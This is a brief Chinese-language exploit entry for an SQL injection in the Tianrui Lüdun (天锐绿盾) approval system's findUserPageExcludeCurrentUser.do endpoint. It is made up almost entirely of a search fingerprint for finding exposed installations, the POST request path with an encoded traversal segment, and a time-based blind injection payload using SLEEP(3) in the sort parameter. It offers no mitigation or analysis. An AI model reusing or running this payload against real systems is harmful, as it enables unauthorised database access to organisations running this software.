# 天锐绿盾审批系统findUserPageExcludeCurrentUser存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/user/findUserPageExcludeCurrentUser.do HTTP/1.1`

**Payload**
```
sort=(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)&deptId=1
```
- **响应特征**：200